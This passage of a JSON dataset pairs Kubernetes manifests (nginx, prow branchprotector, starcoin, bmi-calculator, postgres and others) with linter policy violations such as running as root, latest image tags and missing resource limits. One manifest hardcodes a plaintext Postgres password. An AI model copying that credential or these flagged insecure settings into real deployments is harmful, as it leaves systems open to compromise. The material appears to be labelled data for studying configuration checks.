    "violation_text": "no pods found matching service labels (map[app:apikeystore])"
  },
  {
    "id": "10182",
    "manifest_path": "data/manifests/the_stack_sample/sample_3922.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: burstable-memory-nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.19\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            memory: 100Mi\n          limits:\n            memory: 200Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10183",
    "manifest_path": "data/manifests/the_stack_sample/sample_3922.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: burstable-memory-nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.19\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            memory: 100Mi\n          limits:\n            memory: 200Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10184",
    "manifest_path": "data/manifests/the_stack_sample/sample_3922.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: burstable-memory-nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.19\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            memory: 100Mi\n          limits:\n            memory: 200Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10185",
    "manifest_path": "data/manifests/the_stack_sample/sample_3923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10186",
    "manifest_path": "data/manifests/the_stack_sample/sample_3923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10187",
    "manifest_path": "data/manifests/the_stack_sample/sample_3923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10188",
    "manifest_path": "data/manifests/the_stack_sample/sample_3923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10189",
    "manifest_path": "data/manifests/the_stack_sample/sample_3923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6710\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10190",
    "manifest_path": "data/manifests/the_stack_sample/sample_3929.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20201204-d90be1ef6b\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --github-token-path=/etc/github/token\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"branchprotector\" does not have a read-only root file system"
  },
  {
    "id": "10191",
    "manifest_path": "data/manifests/the_stack_sample/sample_3929.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20201204-d90be1ef6b\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --github-token-path=/etc/github/token\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"branchprotector\" is not set to runAsNonRoot"
  },
  {
    "id": "10192",
    "manifest_path": "data/manifests/the_stack_sample/sample_3929.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20201204-d90be1ef6b\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --github-token-path=/etc/github/token\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"branchprotector\" has cpu request 0"
  },
  {
    "id": "10193",
    "manifest_path": "data/manifests/the_stack_sample/sample_3929.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20201204-d90be1ef6b\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --github-token-path=/etc/github/token\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"branchprotector\" has memory limit 0"
  },
  {
    "id": "10194",
    "manifest_path": "data/manifests/the_stack_sample/sample_3931.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-proxima\n  labels:\n    app: starcoin\n    network: proxima\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 3\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: proxima\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.6.0\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/proxima/starcoin.ipc /sc-data/proxima/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n proxima\n          -d /sc-data --discover-local=true $node_key_flag; ret=$?; if [ $ret -ne\n          0 ]; then echo \"Node start fail, try to remove config.\"; rm /sc-data/proxima/config.toml;\n          rm /sc-data/proxima/genesis_config.json; fi; if [ $ret -eq 120 ]; then echo\n          \"Start failed with gensis mismatch code 120, clean data...\"; rm -rf /sc-data/proxima/\n          &>/dev/null; fi;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10195",
    "manifest_path": "data/manifests/the_stack_sample/sample_3931.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-proxima\n  labels:\n    app: starcoin\n    network: proxima\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 3\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: proxima\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.6.0\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/proxima/starcoin.ipc /sc-data/proxima/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n proxima\n          -d /sc-data --discover-local=true $node_key_flag; ret=$?; if [ $ret -ne\n          0 ]; then echo \"Node start fail, try to remove config.\"; rm /sc-data/proxima/config.toml;\n          rm /sc-data/proxima/genesis_config.json; fi; if [ $ret -eq 120 ]; then echo\n          \"Start failed with gensis mismatch code 120, clean data...\"; rm -rf /sc-data/proxima/\n          &>/dev/null; fi;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"starcoin\" does not have a read-only root file system"
  },
  {
    "id": "10196",
    "manifest_path": "data/manifests/the_stack_sample/sample_3931.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-proxima\n  labels:\n    app: starcoin\n    network: proxima\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 3\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: proxima\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.6.0\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/proxima/starcoin.ipc /sc-data/proxima/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n proxima\n          -d /sc-data --discover-local=true $node_key_flag; ret=$?; if [ $ret -ne\n          0 ]; then echo \"Node start fail, try to remove config.\"; rm /sc-data/proxima/config.toml;\n          rm /sc-data/proxima/genesis_config.json; fi; if [ $ret -eq 120 ]; then echo\n          \"Start failed with gensis mismatch code 120, clean data...\"; rm -rf /sc-data/proxima/\n          &>/dev/null; fi;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"starcoin\" is not set to runAsNonRoot"
  },
  {
    "id": "10197",
    "manifest_path": "data/manifests/the_stack_sample/sample_3931.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-proxima\n  labels:\n    app: starcoin\n    network: proxima\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 3\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: proxima\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.6.0\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/proxima/starcoin.ipc /sc-data/proxima/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n proxima\n          -d /sc-data --discover-local=true $node_key_flag; ret=$?; if [ $ret -ne\n          0 ]; then echo \"Node start fail, try to remove config.\"; rm /sc-data/proxima/config.toml;\n          rm /sc-data/proxima/genesis_config.json; fi; if [ $ret -eq 120 ]; then echo\n          \"Start failed with gensis mismatch code 120, clean data...\"; rm -rf /sc-data/proxima/\n          &>/dev/null; fi;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"starcoin\" has cpu request 0"
  },
  {
    "id": "10198",
    "manifest_path": "data/manifests/the_stack_sample/sample_3931.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: starcoin\n  namespace: starcoin-proxima\n  labels:\n    app: starcoin\n    network: proxima\nspec:\n  selector:\n    matchLabels:\n      app: starcoin\n  replicas: 3\n  template:\n    metadata:\n      name: starcoin\n      labels:\n        app: starcoin\n        network: proxima\n    spec:\n      containers:\n      - name: starcoin\n        image: starcoin/starcoin:v1.6.0\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - rm -rf /sc-data/proxima/starcoin.ipc /sc-data/proxima/starcoindb/db/starcoindb/LOCK;\n          id=$(echo -e $POD_NAME|awk -F'-' '{print $2}') && IFS='; ' read -r -a node_keys\n          <<< $NODE_KEYS && node_key=${node_keys[$id]}; if [ ! -z $node_key ]; then\n          node_key_flag=\"--node-key ${node_key}\"; fi; /starcoin/starcoin -n proxima\n          -d /sc-data --discover-local=true $node_key_flag; ret=$?; if [ $ret -ne\n          0 ]; then echo \"Node start fail, try to remove config.\"; rm /sc-data/proxima/config.toml;\n          rm /sc-data/proxima/genesis_config.json; fi; if [ $ret -eq 120 ]; then echo\n          \"Start failed with gensis mismatch code 120, clean data...\"; rm -rf /sc-data/proxima/\n          &>/dev/null; fi;\n        ports:\n        - containerPort: 9840\n          hostPort: 9840\n        volumeMounts:\n        - name: starcoin-volume\n          mountPath: /sc-data\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NODE_KEYS\n          valueFrom:\n            secretKeyRef:\n              name: node-keys\n              key: node-keys\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"starcoin\" has memory limit 0"
  },
  {
    "id": "10199",
    "manifest_path": "data/manifests/the_stack_sample/sample_3932.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: bmi-calculator\n  name: bmi-calculator\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: bmi-calculator\n  template:\n    metadata:\n      labels:\n        app: bmi-calculator\n    spec:\n      containers:\n      - image: raylayadi/bmi-calculator:latest\n        imagePullPolicy: Always\n        name: bmi-calculator\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: bmi-calculator-cm\n        resources: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"bmi-calculator\" is using an invalid container image, \"raylayadi/bmi-calculator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10200",
    "manifest_path": "data/manifests/the_stack_sample/sample_3932.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: bmi-calculator\n  name: bmi-calculator\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: bmi-calculator\n  template:\n    metadata:\n      labels:\n        app: bmi-calculator\n    spec:\n      containers:\n      - image: raylayadi/bmi-calculator:latest\n        imagePullPolicy: Always\n        name: bmi-calculator\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: bmi-calculator-cm\n        resources: {}\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10201",
    "manifest_path": "data/manifests/the_stack_sample/sample_3932.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: bmi-calculator\n  name: bmi-calculator\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: bmi-calculator\n  template:\n    metadata:\n      labels:\n        app: bmi-calculator\n    spec:\n      containers:\n      - image: raylayadi/bmi-calculator:latest\n        imagePullPolicy: Always\n        name: bmi-calculator\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: bmi-calculator-cm\n        resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"bmi-calculator\" does not have a read-only root file system"
  },
  {
    "id": "10202",
    "manifest_path": "data/manifests/the_stack_sample/sample_3932.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: bmi-calculator\n  name: bmi-calculator\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: bmi-calculator\n  template:\n    metadata:\n      labels:\n        app: bmi-calculator\n    spec:\n      containers:\n      - image: raylayadi/bmi-calculator:latest\n        imagePullPolicy: Always\n        name: bmi-calculator\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: bmi-calculator-cm\n        resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"bmi-calculator\" is not set to runAsNonRoot"
  },
  {
    "id": "10203",
    "manifest_path": "data/manifests/the_stack_sample/sample_3932.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: bmi-calculator\n  name: bmi-calculator\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: bmi-calculator\n  template:\n    metadata:\n      labels:\n        app: bmi-calculator\n    spec:\n      containers:\n      - image: raylayadi/bmi-calculator:latest\n        imagePullPolicy: Always\n        name: bmi-calculator\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: bmi-calculator-cm\n        resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"bmi-calculator\" has cpu request 0"
  },
  {
    "id": "10204",
    "manifest_path": "data/manifests/the_stack_sample/sample_3932.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: bmi-calculator\n  name: bmi-calculator\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: bmi-calculator\n  template:\n    metadata:\n      labels:\n        app: bmi-calculator\n    spec:\n      containers:\n      - image: raylayadi/bmi-calculator:latest\n        imagePullPolicy: Always\n        name: bmi-calculator\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: bmi-calculator-cm\n        resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"bmi-calculator\" has memory limit 0"
  },
  {
    "id": "10205",
    "manifest_path": "data/manifests/the_stack_sample/sample_3933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: city-db-postgres\n  labels:\n    app: city-db-postgres\n    tier: backend\nspec:\n  selector:\n    matchLabels:\n      app: city-db-postgres\n  template:\n    metadata:\n      labels:\n        app: city-db-postgres\n    spec:\n      containers:\n      - name: city-db-postgres\n        image: postgres:alpine\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_PASSWORD\n          value: QDfz8EiAGk7GAhryaRg\n        resources:\n          requests:\n            cpu: 50m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"city-db-postgres\" does not have a read-only root file system"
  },
  {
    "id": "10206",
    "manifest_path": "data/manifests/the_stack_sample/sample_3933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: city-db-postgres\n  labels:\n    app: city-db-postgres\n    tier: backend\nspec:\n  selector:\n    matchLabels:\n      app: city-db-postgres\n  template:\n    metadata:\n      labels:\n        app: city-db-postgres\n    spec:\n      containers:\n      - name: city-db-postgres\n        image: postgres:alpine\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_PASSWORD\n          value: QDfz8EiAGk7GAhryaRg\n        resources:\n          requests:\n            cpu: 50m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"city-db-postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "10207",
    "manifest_path": "data/manifests/the_stack_sample/sample_3933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: city-db-postgres\n  labels:\n    app: city-db-postgres\n    tier: backend\nspec:\n  selector:\n    matchLabels:\n      app: city-db-postgres\n  template:\n    metadata:\n      labels:\n        app: city-db-postgres\n    spec:\n      containers:\n      - name: city-db-postgres\n        image: postgres:alpine\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_PASSWORD\n          value: QDfz8EiAGk7GAhryaRg\n        resources:\n          requests:\n            cpu: 50m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"city-db-postgres\" has memory limit 0"
  },
  {
    "id": "10208",
    "manifest_path": "data/manifests/the_stack_sample/sample_3935.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment\n  labels:\n    app: reddit\n    component: comment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n    spec:\n      containers:\n      - image: windiego1/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"comment\" is using an invalid container image, \"windiego1/comment\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10209",
    "manifest_path": "data/manifests/the_stack_sample/sample_3935.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment\n  labels:\n    app: reddit\n    component: comment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n    spec:\n      containers:\n      - image: windiego1/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10210",
    "manifest_path": "data/manifests/the_stack_sample/sample_3935.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment\n  labels:\n    app: reddit\n    component: comment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n    spec:\n      containers:\n      - image: windiego1/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"comment\" does not have a read-only root file system"
  },
  {
    "id": "10211",
    "manifest_path": "data/manifests/the_stack_sample/sample_3935.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment\n  labels:\n    app: reddit\n    component: comment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n    spec:\n      containers:\n      - image: windiego1/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"comment\" is not set to runAsNonRoot"
  },
  {
    "id": "10212",
    "manifest_path": "data/manifests/the_stack_sample/sample_3935.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment\n  labels:\n    app: reddit\n    component: comment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n    spec:\n      containers:\n      - image: windiego1/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"comment\" has cpu request 0"
  },
  {
    "id": "10213",
    "manifest_path": "data/manifests/the_stack_sample/sample_3935.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment\n  labels:\n    app: reddit\n    component: comment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n    spec:\n      containers:\n      - image: windiego1/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"comment\" has memory limit 0"
  },
  {
    "id": "10214",
    "manifest_path": "data/manifests/the_stack_sample/sample_3937.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: docker-registry\n  labels:\n    component: docker-registry\nspec:\n  type: NodePort\n  selector:\n    component: docker-registry\n  ports:\n  - name: http\n    port: 5000\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:docker-registry])"
  },
  {
    "id": "10215",
    "manifest_path": "data/manifests/the_stack_sample/sample_3938.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        - --cache-server=cache:6379\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#fcbd00'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "10216",
    "manifest_path": "data/manifests/the_stack_sample/sample_3938.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        - --cache-server=cache:6379\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#fcbd00'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          